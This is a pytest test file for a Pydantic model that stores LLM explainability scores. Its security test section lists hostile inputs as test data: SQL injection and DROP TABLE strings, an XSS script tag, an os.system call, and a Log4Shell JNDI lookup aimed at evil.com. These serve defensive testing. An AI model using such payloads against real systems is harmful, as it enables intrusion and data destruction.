"""
MIT License
https://mit-license.org/
Copyright © 2025 Infosys Ltd.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

import pytest
import sys
import os
from typing import Dict, Any
from pydantic import ValidationError
import json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from dao.mappers.explain import Explain


# ==================== FIXTURES ====================

@pytest.fixture
def valid_explain_data():
    """Fixture providing valid explain data"""
    return {
        "sub_category": "reasoning",
        "model_name": "gpt-4",
        "cot": "0.85",
        "thot": "0.88",
        "reread_cot": "0.90",
        "reread_thot": "0.92",
        "cov": "0.87",
        "hallucination": "0.10",
        "final_score": "0.884"
    }


@pytest.fixture
def explain_instance(valid_explain_data):
    """Fixture providing an Explain instance"""
    return Explain(**valid_explain_data)


@pytest.fixture
def minimal_explain_data():
    """Fixture with minimal valid data"""
    return {
        "sub_category": "test",
        "model_name": "test-model",
        "cot": "0.0",
        "thot": "0.0",
        "reread_cot": "0.0",
        "reread_thot": "0.0",
        "cov": "0.0",
        "hallucination": "0.0",
        "final_score": "0.0"
    }


@pytest.fixture
def various_scores_data():
    """Fixture with various score formats"""
    return {
        "sub_category": "analysis",
        "model_name": "claude-3",
        "cot": "0.123",
        "thot": "0.999",
        "reread_cot": "0.500",
        "reread_thot": "0.001",
        "cov": "1.0",
        "hallucination": "0.05",
        "final_score": "0.5246"
    }


# ==================== FUNCTIONAL CORRECTNESS TESTS ====================

class TestExplainFunctionalCorrectness:
    """Test functional correctness of Explain model"""
    
    def test_create_explain_with_all_fields(self, valid_explain_data):
        """Test creating Explain instance with all fields"""
        explain = Explain(**valid_explain_data)
        
        assert explain.sub_category == "reasoning"
        assert explain.model_name == "gpt-4"
        assert explain.cot == "0.85"
        assert explain.thot == "0.88"
        assert explain.reread_cot == "0.90"
        assert explain.reread_thot == "0.92"
        assert explain.cov == "0.87"
        assert explain.hallucination == "0.10"
        assert explain.final_score == "0.884"
    
    def test_all_fields_are_strings(self, valid_explain_data):
        """Test that all fields are stored as strings"""
        explain = Explain(**valid_explain_data)
        
        assert isinstance(explain.sub_category, str)
        assert isinstance(explain.model_name, str)
        assert isinstance(explain.cot, str)
        assert isinstance(explain.thot, str)
        assert isinstance(explain.reread_cot, str)
        assert isinstance(explain.reread_thot, str)
        assert isinstance(explain.cov, str)
        assert isinstance(explain.hallucination, str)
        assert isinstance(explain.final_score, str)
    
    def test_sub_category_field_variations(self, valid_explain_data):
        """Test various sub_category values"""
        categories = [
            "reasoning",
            "logic",
            "inference",
            "explanation",
            "chain-of-thought",
            "analysis_task",
            "test123"
        ]
        
        for category in categories:
            valid_explain_data["sub_category"] = category
            explain = Explain(**valid_explain_data)
            assert explain.sub_category == category
    
    def test_model_name_field_variations(self, valid_explain_data):
        """Test various model_name values"""
        model_names = [
            "gpt-4",
            "gpt-3.5-turbo",
            "claude-3-opus",
            "llama-2-70b",
            "mistral-7b",
            "gemini-pro"
        ]
        
        for model_name in model_names:
            valid_explain_data["model_name"] = model_name
            explain = Explain(**valid_explain_data)
            assert explain.model_name == model_name
    
    def test_cot_field(self, valid_explain_data):
        """Test chain-of-thought (cot) field"""
        test_values = ["0.0", "0.5", "0.999", "1.0"]
        
        for value in test_values:
            valid_explain_data["cot"] = value
            explain = Explain(**valid_explain_data)
            assert explain.cot == value
    
    def test_thot_field(self, valid_explain_data):
        """Test tree-of-thought (thot) field"""
        test_values = ["0.0", "0.25", "0.75", "1.0"]
        
        for value in test_values:
            valid_explain_data["thot"] = value
            explain = Explain(**valid_explain_data)
            assert explain.thot == value
    
    def test_reread_cot_field(self, valid_explain_data):
        """Test reread chain-of-thought field"""
        test_values = ["0.1", "0.5", "0.9"]
        
        for value in test_values:
            valid_explain_data["reread_cot"] = value
            explain = Explain(**valid_explain_data)
            assert explain.reread_cot == value
    
    def test_reread_thot_field(self, valid_explain_data):
        """Test reread tree-of-thought field"""
        test_values = ["0.2", "0.6", "0.95"]
        
        for value in test_values:
            valid_explain_data["reread_thot"] = value
            explain = Explain(**valid_explain_data)
            assert explain.reread_thot == value
    
    def test_cov_field(self, valid_explain_data):
        """Test coverage (cov) field"""
        test_values = ["0.0", "0.33", "0.67", "1.0"]
        
        for value in test_values:
            valid_explain_data["cov"] = value
            explain = Explain(**valid_explain_data)
            assert explain.cov == value
    
    def test_hallucination_field(self, valid_explain_data):
        """Test hallucination field"""
        test_values = ["0.0", "0.05", "0.15", "0.50"]
        
        for value in test_values:
            valid_explain_data["hallucination"] = value
            explain = Explain(**valid_explain_data)
            assert explain.hallucination == value
    
    def test_final_score_field(self, valid_explain_data):
        """Test final_score field"""
        test_values = ["0.0", "0.123", "0.888", "1.0"]
        
        for value in test_values:
            valid_explain_data["final_score"] = value
            explain = Explain(**valid_explain_data)
            assert explain.final_score == value


# ==================== EDGE CASES TESTS ====================

class TestExplainEdgeCases:
    """Test edge cases for Explain model"""
    
    def test_empty_string_values(self, valid_explain_data):
        """Test that empty strings are accepted"""
        valid_explain_data["sub_category"] = ""
        valid_explain_data["cot"] = ""
        
        explain = Explain(**valid_explain_data)
        
        assert explain.sub_category == ""
        assert explain.cot == ""
    
    def test_very_long_string_values(self, valid_explain_data):
        """Test handling of very long string values"""
        long_value = "0." + "1234567890" * 100
        valid_explain_data["final_score"] = long_value
        
        explain = Explain(**valid_explain_data)
        
        assert explain.final_score == long_value
        assert len(explain.final_score) > 1000
    
    def test_special_characters_in_string_fields(self, valid_explain_data):
        """Test special characters in string fields"""
        special_values = [
            "0.85%",
            "N/A",
            "null",
            "undefined",
            "-0.5",
            "+0.95",
            "0,85"
        ]
        
        for value in special_values:
            valid_explain_data["cot"] = value
            explain = Explain(**valid_explain_data)
            assert explain.cot == value
    
    def test_whitespace_in_strings(self, valid_explain_data):
        """Test handling of whitespace in string fields"""
        valid_explain_data["sub_category"] = "  reasoning  "
        valid_explain_data["final_score"] = " 0.85 "
        
        explain = Explain(**valid_explain_data)
        
        assert explain.sub_category == "  reasoning  "
        assert explain.final_score == " 0.85 "
    
    def test_zero_values(self, valid_explain_data):
        """Test zero values for score fields"""
        valid_explain_data["cot"] = "0"
        valid_explain_data["thot"] = "0.0"
        valid_explain_data["final_score"] = "0.00"
        
        explain = Explain(**valid_explain_data)
        
        assert explain.cot == "0"
        assert explain.thot == "0.0"
        assert explain.final_score == "0.00"
    
    def test_very_large_score_values(self, valid_explain_data):
        """Test very large numeric string values"""
        valid_explain_data["final_score"] = "999999.999999"
        
        explain = Explain(**valid_explain_data)
        
        assert explain.final_score == "999999.999999"
    
    def test_negative_score_values(self, valid_explain_data):
        """Test negative score values"""
        valid_explain_data["cot"] = "-0.5"
        valid_explain_data["hallucination"] = "-100"
        
        explain = Explain(**valid_explain_data)
        
        assert explain.cot == "-0.5"
        assert explain.hallucination == "-100"
    
    def test_unicode_characters_in_fields(self, valid_explain_data):
        """Test unicode characters in string fields"""
        unicode_values = [
            "推理",  # Chinese
            "Рассуждение",  # Russian
            "推論",  # Japanese
            "🤔",  # Emoji
            "Model™"
        ]
        
        for value in unicode_values:
            valid_explain_data["sub_category"] = value
            explain = Explain(**valid_explain_data)
            assert explain.sub_category == value
    
    def test_single_character_values(self, valid_explain_data):
        """Test single character values"""
        valid_explain_data["sub_category"] = "A"
        valid_explain_data["cot"] = "1"
        
        explain = Explain(**valid_explain_data)
        
        assert explain.sub_category == "A"
        assert explain.cot == "1"
    
    def test_very_long_sub_category(self, valid_explain_data):
        """Test very long sub_category"""
        long_category = "category_" * 1000
        valid_explain_data["sub_category"] = long_category
        
        explain = Explain(**valid_explain_data)
        
        assert explain.sub_category == long_category
        assert len(explain.sub_category) >= 9000  # Changed to >= to account for exact 9000
    
    def test_numeric_string_formats(self, valid_explain_data):
        """Test various numeric string formats"""
        formats = [
            "0.5",
            ".5",
            "0.500",
            "0.5000000",
            "5e-1",
            "5E-1"
        ]
        
        for fmt in formats:
            valid_explain_data["cot"] = fmt
            explain = Explain(**valid_explain_data)
            assert explain.cot == fmt


# ==================== ERROR HANDLING & VALIDATION TESTS ====================

class TestExplainErrorHandling:
    """Test error handling and validation"""
    
    def test_missing_required_sub_category(self, valid_explain_data):
        """Test that missing sub_category raises ValidationError"""
        del valid_explain_data["sub_category"]
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert "sub_category" in str(exc_info.value)
        assert "Field required" in str(exc_info.value)
    
    def test_missing_required_model_name(self, valid_explain_data):
        """Test that missing model_name raises ValidationError"""
        del valid_explain_data["model_name"]
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert "model_name" in str(exc_info.value)
    
    def test_missing_required_cot(self, valid_explain_data):
        """Test that missing cot raises ValidationError"""
        del valid_explain_data["cot"]
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert "cot" in str(exc_info.value)
    
    def test_missing_required_thot(self, valid_explain_data):
        """Test that missing thot raises ValidationError"""
        del valid_explain_data["thot"]
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert "thot" in str(exc_info.value)
    
    def test_missing_required_reread_cot(self, valid_explain_data):
        """Test that missing reread_cot raises ValidationError"""
        del valid_explain_data["reread_cot"]
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert "reread_cot" in str(exc_info.value)
    
    def test_missing_required_reread_thot(self, valid_explain_data):
        """Test that missing reread_thot raises ValidationError"""
        del valid_explain_data["reread_thot"]
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert "reread_thot" in str(exc_info.value)
    
    def test_missing_required_cov(self, valid_explain_data):
        """Test that missing cov raises ValidationError"""
        del valid_explain_data["cov"]
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert "cov" in str(exc_info.value)
    
    def test_missing_required_hallucination(self, valid_explain_data):
        """Test that missing hallucination raises ValidationError"""
        del valid_explain_data["hallucination"]
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert "hallucination" in str(exc_info.value)
    
    def test_missing_required_final_score(self, valid_explain_data):
        """Test that missing final_score raises ValidationError"""
        del valid_explain_data["final_score"]
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert "final_score" in str(exc_info.value)
    
    def test_none_value_for_required_field(self, valid_explain_data):
        """Test that None value for required field raises ValidationError"""
        valid_explain_data["sub_category"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert "sub_category" in str(exc_info.value)
    
    def test_none_value_for_score_field(self, valid_explain_data):
        """Test that None value for score field raises ValidationError"""
        valid_explain_data["cot"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert "cot" in str(exc_info.value)
    
    def test_empty_dict_initialization(self):
        """Test that empty dict raises ValidationError"""
        with pytest.raises(ValidationError) as exc_info:
            Explain()
        
        errors = str(exc_info.value)
        assert "sub_category" in errors
        assert "model_name" in errors
        assert "cot" in errors
    
    def test_extra_fields_handling(self, valid_explain_data):
        """Test handling of extra fields not in model"""
        valid_explain_data["extra_field"] = "extra_value"
        valid_explain_data["another_field"] = 123
        
        # By default, Pydantic ignores extra fields
        explain = Explain(**valid_explain_data)
        
        assert not hasattr(explain, "extra_field")
        assert not hasattr(explain, "another_field")
    
    def test_multiple_missing_fields(self):
        """Test that multiple missing fields are reported"""
        incomplete_data = {
            "sub_category": "test"
            # All other fields missing
        }
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**incomplete_data)
        
        error_str = str(exc_info.value)
        assert "model_name" in error_str
        assert "cot" in error_str
        assert "thot" in error_str


# ==================== SERIALIZATION & DESERIALIZATION TESTS ====================

class TestExplainSerialization:
    """Test serialization and deserialization"""
    
    def test_model_dump(self, explain_instance):
        """Test converting Explain instance to dictionary"""
        data = explain_instance.model_dump()
        
        assert isinstance(data, dict)
        assert data["sub_category"] == "reasoning"
        assert data["model_name"] == "gpt-4"
        assert data["cot"] == "0.85"
        assert len(data) == 9  # All 9 fields
    
    def test_model_dump_json(self, explain_instance):
        """Test converting Explain instance to JSON string"""
        json_str = explain_instance.model_dump_json()
        
        assert isinstance(json_str, str)
        assert "reasoning" in json_str
        assert "gpt-4" in json_str
        
        # Verify it's valid JSON
        parsed = json.loads(json_str)
        assert parsed["sub_category"] == "reasoning"
    
    def test_model_dump_exclude_fields(self, explain_instance):
        """Test excluding fields during serialization"""
        data = explain_instance.model_dump(exclude={"hallucination", "final_score"})
        
        assert "sub_category" in data
        assert "cot" in data
        assert "hallucination" not in data
        assert "final_score" not in data
    
    def test_model_dump_include_fields(self, explain_instance):
        """Test including only specific fields during serialization"""
        data = explain_instance.model_dump(include={"model_name", "final_score"})
        
        assert "model_name" in data
        assert "final_score" in data
        assert "sub_category" not in data
        assert "cot" not in data
    
    def test_json_deserialization(self, valid_explain_data):
        """Test creating Explain from JSON string"""
        json_str = json.dumps(valid_explain_data)
        explain = Explain.model_validate_json(json_str)
        
        assert explain.model_name == valid_explain_data["model_name"]
        assert explain.final_score == valid_explain_data["final_score"]
    
    def test_dict_deserialization(self, valid_explain_data):
        """Test creating Explain from dictionary"""
        explain = Explain.model_validate(valid_explain_data)
        
        assert explain.sub_category == valid_explain_data["sub_category"]
        assert explain.cot == valid_explain_data["cot"]
    
    def test_roundtrip_serialization(self, explain_instance):
        """Test that serialization and deserialization preserve data"""
        # Serialize to dict
        data = explain_instance.model_dump()
        
        # Deserialize back
        explain_copy = Explain(**data)
        
        # Compare all fields
        assert explain_copy.sub_category == explain_instance.sub_category
        assert explain_copy.model_name == explain_instance.model_name
        assert explain_copy.cot == explain_instance.cot
        assert explain_copy.thot == explain_instance.thot
        assert explain_copy.reread_cot == explain_instance.reread_cot
        assert explain_copy.reread_thot == explain_instance.reread_thot
        assert explain_copy.cov == explain_instance.cov
        assert explain_copy.hallucination == explain_instance.hallucination
        assert explain_copy.final_score == explain_instance.final_score
    
    def test_json_roundtrip(self, explain_instance):
        """Test JSON serialization and deserialization roundtrip"""
        json_str = explain_instance.model_dump_json()
        explain_copy = Explain.model_validate_json(json_str)
        
        assert explain_copy.model_name == explain_instance.model_name
        assert explain_copy.final_score == explain_instance.final_score
        assert explain_copy.sub_category == explain_instance.sub_category


# ==================== EQUALITY & COMPARISON TESTS ====================

class TestExplainEquality:
    """Test equality and comparison operations"""
    
    def test_equality_same_values(self, valid_explain_data):
        """Test that two Explain instances with same values are equal"""
        explain1 = Explain(**valid_explain_data)
        explain2 = Explain(**valid_explain_data)
        
        assert explain1 == explain2
    
    def test_inequality_different_sub_category(self, valid_explain_data):
        """Test that Explain instances with different sub_category are not equal"""
        explain1 = Explain(**valid_explain_data)
        
        valid_explain_data["sub_category"] = "different-category"
        explain2 = Explain(**valid_explain_data)
        
        assert explain1 != explain2
    
    def test_inequality_different_score(self, valid_explain_data):
        """Test that Explain instances with different score are not equal"""
        explain1 = Explain(**valid_explain_data)
        
        valid_explain_data["final_score"] = "0.99"
        explain2 = Explain(**valid_explain_data)
        
        assert explain1 != explain2
    
    def test_inequality_different_model_name(self, valid_explain_data):
        """Test that Explain instances with different model_name are not equal"""
        explain1 = Explain(**valid_explain_data)
        
        valid_explain_data["model_name"] = "different-model"
        explain2 = Explain(**valid_explain_data)
        
        assert explain1 != explain2


# ==================== IMMUTABILITY & STATE TESTS ====================

class TestExplainImmutability:
    """Test immutability and state management"""
    
    def test_field_modification(self, explain_instance):
        """Test that fields can be modified"""
        original_category = explain_instance.sub_category
        explain_instance.sub_category = "new-category"
        
        assert explain_instance.sub_category == "new-category"
        assert explain_instance.sub_category != original_category
    
    def test_score_field_reassignment(self, explain_instance):
        """Test that score fields can be reassigned"""
        explain_instance.final_score = "0.95"
        
        assert isinstance(explain_instance.final_score, str)
        assert explain_instance.final_score == "0.95"
    
    def test_multiple_field_modifications(self, explain_instance):
        """Test modifying multiple fields"""
        explain_instance.cot = "0.99"
        explain_instance.thot = "0.98"
        explain_instance.final_score = "0.985"
        
        assert explain_instance.cot == "0.99"
        assert explain_instance.thot == "0.98"
        assert explain_instance.final_score == "0.985"


# ==================== PERFORMANCE TESTS ====================

class TestExplainPerformance:
    """Test performance characteristics"""
    
    def test_instantiation_performance(self, valid_explain_data):
        """Test that Explain instantiation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Explain(**valid_explain_data)
        end_time = time.time()
        
        # 1000 instantiations should complete quickly
        assert (end_time - start_time) < 1.0
    
    def test_serialization_performance(self, explain_instance):
        """Test that serialization is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            explain_instance.model_dump()
        end_time = time.time()
        
        # 1000 serializations should complete quickly
        assert (end_time - start_time) < 0.5
    
    def test_validation_performance(self, valid_explain_data):
        """Test that validation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Explain.model_validate(valid_explain_data)
        end_time = time.time()
        
        # 1000 validations should complete quickly
        assert (end_time - start_time) < 1.0


# ==================== CODE QUALITY & STRUCTURE TESTS ====================

class TestExplainCodeQuality:
    """Test code quality and structure"""
    
    def test_explain_is_pydantic_basemodel(self):
        """Test that Explain inherits from BaseModel"""
        from pydantic import BaseModel
        assert issubclass(Explain, BaseModel)
    
    def test_all_required_fields_present(self):
        """Test that all expected fields are defined"""
        fields = Explain.model_fields
        
        assert "sub_category" in fields
        assert "model_name" in fields
        assert "cot" in fields
        assert "thot" in fields
        assert "reread_cot" in fields
        assert "reread_thot" in fields
        assert "cov" in fields
        assert "hallucination" in fields
        assert "final_score" in fields
    
    def test_field_count(self):
        """Test that model has exactly 9 fields"""
        fields = Explain.model_fields
        assert len(fields) == 9
    
    def test_field_types(self):
        """Test that fields have correct type annotations"""
        fields = Explain.model_fields
        
        # All fields should be strings
        assert fields["sub_category"].annotation == str
        assert fields["model_name"].annotation == str
        assert fields["cot"].annotation == str
        assert fields["thot"].annotation == str
        assert fields["reread_cot"].annotation == str
        assert fields["reread_thot"].annotation == str
        assert fields["cov"].annotation == str
        assert fields["hallucination"].annotation == str
        assert fields["final_score"].annotation == str
    
    def test_no_optional_fields(self):
        """Test that all fields are required (no defaults)"""
        fields = Explain.model_fields
        
        for field_name, field_info in fields.items():
            assert field_info.is_required(), f"Field {field_name} should be required"
    
    def test_explain_has_string_representation(self, explain_instance):
        """Test that Explain instance has string representation"""
        str_repr = str(explain_instance)
        
        assert isinstance(str_repr, str)
        assert len(str_repr) > 0
    
    def test_explain_has_repr(self, explain_instance):
        """Test that Explain instance has repr"""
        repr_str = repr(explain_instance)
        
        assert isinstance(repr_str, str)
        assert "Explain" in repr_str


# ==================== PARAMETRIZED TESTS ====================

class TestExplainParametrized:
    """Parametrized tests for comprehensive coverage"""
    
    @pytest.mark.parametrize("field_name,field_value", [
        ("cot", "0.1"),
        ("cot", "0.999999"),
        ("thot", "0.0"),
        ("thot", "1.0"),
        ("reread_cot", "0.5"),
        ("reread_thot", "0.75"),
        ("cov", "0.25"),
        ("hallucination", "0.15"),
        ("final_score", "0.888"),
    ])
    def test_various_score_values(self, valid_explain_data, field_name, field_value):
        """Test various score values for different fields"""
        valid_explain_data[field_name] = field_value
        explain = Explain(**valid_explain_data)
        
        assert getattr(explain, field_name) == field_value
    
    @pytest.mark.parametrize("model_name", [
        "gpt-3.5-turbo",
        "gpt-4",
        "gpt-4-turbo",
        "claude-2",
        "claude-3-opus",
        "claude-3-sonnet",
        "llama-2-7b",
        "llama-2-70b",
        "mistral-7b",
        "mixtral-8x7b",
        "palm-2",
        "gemini-pro",
        "gemini-ultra",
    ])
    def test_various_model_names(self, valid_explain_data, model_name):
        """Test various common model names"""
        valid_explain_data["model_name"] = model_name
        explain = Explain(**valid_explain_data)
        
        assert explain.model_name == model_name
    
    @pytest.mark.parametrize("sub_category", [
        "reasoning",
        "logic",
        "inference",
        "explanation",
        "analysis",
        "understanding",
        "comprehension",
        "chain-of-thought",
        "tree-of-thought",
        "step-by-step",
    ])
    def test_various_sub_categories(self, valid_explain_data, sub_category):
        """Test various sub_category values"""
        valid_explain_data["sub_category"] = sub_category
        explain = Explain(**valid_explain_data)
        
        assert explain.sub_category == sub_category
    
    @pytest.mark.parametrize("missing_field", [
        "sub_category",
        "model_name",
        "cot",
        "thot",
        "reread_cot",
        "reread_thot",
        "cov",
        "hallucination",
        "final_score",
    ])
    def test_missing_required_fields(self, valid_explain_data, missing_field):
        """Test that missing any required field raises ValidationError"""
        del valid_explain_data[missing_field]
        
        with pytest.raises(ValidationError) as exc_info:
            Explain(**valid_explain_data)
        
        assert missing_field in str(exc_info.value)
    
    @pytest.mark.parametrize("score_field,score_value", [
        ("cot", "0.0"),
        ("thot", "0.5"),
        ("reread_cot", "1.0"),
        ("reread_thot", "0.33"),
        ("cov", "0.67"),
        ("hallucination", "0.10"),
        ("final_score", "0.85"),
    ])
    def test_score_fields_with_various_values(self, valid_explain_data, score_field, score_value):
        """Test all score fields with various numeric string values"""
        valid_explain_data[score_field] = score_value
        explain = Explain(**valid_explain_data)
        
        assert getattr(explain, score_field) == score_value
        assert isinstance(getattr(explain, score_field), str)


# ==================== INTEGRATION TESTS ====================

class TestExplainIntegration:
    """Test integration with external systems"""
    
    def test_json_compatibility(self, explain_instance):
        """Test that Explain can be serialized to standard JSON"""
        json_str = explain_instance.model_dump_json()
        
        # Should be parseable by standard json module
        data = json.loads(json_str)
        assert isinstance(data, dict)
        assert data["model_name"] == explain_instance.model_name
    
    def test_dict_compatibility(self, explain_instance):
        """Test that Explain works with dict operations"""
        data = explain_instance.model_dump()
        
        # Should support dict operations
        assert "model_name" in data
        assert list(data.keys())
        assert list(data.values())
    
    def test_database_ready_format(self, explain_instance):
        """Test that Explain output is ready for database storage"""
        data = explain_instance.model_dump()
        
        # All values should be JSON-serializable types
        json_str = json.dumps(data)
        assert isinstance(json_str, str)
        
        # Should be able to parse back
        parsed = json.loads(json_str)
        assert parsed == data
    
    def test_batch_processing_simulation(self, valid_explain_data):
        """Test creating multiple Explain instances for batch processing"""
        instances = []
        
        for i in range(10):
            data = valid_explain_data.copy()
            data["model_name"] = f"model-{i}"
            data["final_score"] = f"0.{i}{i}"
            instances.append(Explain(**data))
        
        assert len(instances) == 10
        assert instances[0].model_name == "model-0"
        assert instances[9].model_name == "model-9"


# ==================== REGRESSION TESTS ====================

class TestExplainRegression:
    """Test for regression and backward compatibility"""
    
    def test_field_name_with_spaces_in_thot(self):
        """Test that 'thot' field name with spaces in source is handled"""
        # Note: In the source code, thot has spaces: "thot  : str"
        # This test ensures the field works correctly despite formatting
        data = {
            "sub_category": "test",
            "model_name": "test-model",
            "cot": "0.5",
            "thot": "0.6",  # Field name without spaces
            "reread_cot": "0.7",
            "reread_thot": "0.8",
            "cov": "0.75",
            "hallucination": "0.1",
            "final_score": "0.7"
        }
        
        explain = Explain(**data)
        assert explain.thot == "0.6"
    
    def test_backwards_compatible_with_old_data(self):
        """Test that model works with data format from older versions"""
        legacy_data = {
            "sub_category": "legacy-reasoning",
            "model_name": "legacy-model",
            "cot": "0.8",
            "thot": "0.85",
            "reread_cot": "0.82",
            "reread_thot": "0.88",
            "cov": "0.81",
            "hallucination": "0.12",
            "final_score": "0.832"
        }
        
        explain = Explain(**legacy_data)
        
        assert explain.sub_category == "legacy-reasoning"
        assert explain.model_name == "legacy-model"
    
    def test_all_fields_remain_strings(self, valid_explain_data):
        """Regression test to ensure all fields remain string type"""
        explain = Explain(**valid_explain_data)
        
        # Verify all fields are strings (no type changes)
        for field_name in Explain.model_fields:  # Access from class, not instance
            value = getattr(explain, field_name)
            assert isinstance(value, str), f"Field {field_name} should be string, got {type(value)}"


# ==================== SECURITY TESTS ====================

class TestExplainSecurity:
    """Test security aspects"""
    
    def test_no_code_injection_in_sub_category(self, valid_explain_data):
        """Test that sub_category with code-like strings is treated as string"""
        malicious_values = [
            "__import__('os').system('ls')",
            "'; DROP TABLE explain; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for value in malicious_values:
            valid_explain_data["sub_category"] = value
            explain = Explain(**valid_explain_data)
            # Should just store as string, not execute
            assert explain.sub_category == value
            assert isinstance(explain.sub_category, str)
    
    def test_no_code_injection_in_score_fields(self, valid_explain_data):
        """Test that score fields with malicious strings are treated as strings"""
        valid_explain_data["final_score"] = "exec('malicious code')"
        
        explain = Explain(**valid_explain_data)
        
        # Should just store as string, not execute
        assert explain.final_score == "exec('malicious code')"
        assert isinstance(explain.final_score, str)
    
    def test_sql_injection_patterns(self, valid_explain_data):
        """Test various SQL injection patterns"""
        sql_patterns = [
            "1' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin'--",
            "' UNION SELECT * FROM users--",
        ]
        
        for pattern in sql_patterns:
            valid_explain_data["model_name"] = pattern
            explain = Explain(**valid_explain_data)
            assert explain.model_name == pattern


# ==================== SCALABILITY TESTS ====================

class TestExplainScalability:
    """Test scalability aspects"""
    
    def test_handle_multiple_instances(self, valid_explain_data):
        """Test creating multiple Explain instances"""
        instances = []
        
        for i in range(100):
            data = valid_explain_data.copy()
            data["model_name"] = f"model-{i}"
            data["final_score"] = f"0.{i:02d}"
            instances.append(Explain(**data))
        
        assert len(instances) == 100
        assert instances[0].model_name == "model-0"
        assert instances[99].model_name == "model-99"
    
    def test_memory_efficiency_with_many_instances(self, valid_explain_data):
        """Test memory efficiency with many instances"""
        instances = []
        
        for i in range(1000):
            data = valid_explain_data.copy()
            data["model_name"] = f"model-{i}"
            instances.append(Explain(**data))
        
        # All instances should be created successfully
        assert len(instances) == 1000
    
    def test_large_batch_serialization(self, valid_explain_data):
        """Test serializing many instances"""
        instances = [Explain(**valid_explain_data) for _ in range(100)]
        
        serialized = [inst.model_dump() for inst in instances]
        
        assert len(serialized) == 100
        assert all(isinstance(item, dict) for item in serialized)


# ==================== FIELD-SPECIFIC TESTS ====================

class TestExplainFieldSpecific:
    """Test specific behaviors of individual fields"""
    
    def test_cot_represents_chain_of_thought(self, valid_explain_data):
        """Test that cot field properly stores chain-of-thought scores"""
        cot_values = ["0.1", "0.5", "0.9", "1.0"]
        
        for value in cot_values:
            valid_explain_data["cot"] = value
            explain = Explain(**valid_explain_data)
            assert explain.cot == value
    
    def test_thot_represents_tree_of_thought(self, valid_explain_data):
        """Test that thot field properly stores tree-of-thought scores"""
        thot_values = ["0.2", "0.6", "0.95"]
        
        for value in thot_values:
            valid_explain_data["thot"] = value
            explain = Explain(**valid_explain_data)
            assert explain.thot == value
    
    def test_reread_fields_can_differ_from_original(self, valid_explain_data):
        """Test that reread scores can be different from original scores"""
        valid_explain_data["cot"] = "0.5"
        valid_explain_data["reread_cot"] = "0.8"
        valid_explain_data["thot"] = "0.6"
        valid_explain_data["reread_thot"] = "0.9"
        
        explain = Explain(**valid_explain_data)
        
        assert explain.cot != explain.reread_cot
        assert explain.thot != explain.reread_thot
    
    def test_hallucination_score_meaning(self, valid_explain_data):
        """Test hallucination field stores hallucination scores"""
        # Lower hallucination is typically better
        low_hallucination = "0.05"
        high_hallucination = "0.50"
        
        valid_explain_data["hallucination"] = low_hallucination
        explain1 = Explain(**valid_explain_data)
        
        valid_explain_data["hallucination"] = high_hallucination
        explain2 = Explain(**valid_explain_data)
        
        assert explain1.hallucination == low_hallucination
        assert explain2.hallucination == high_hallucination


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
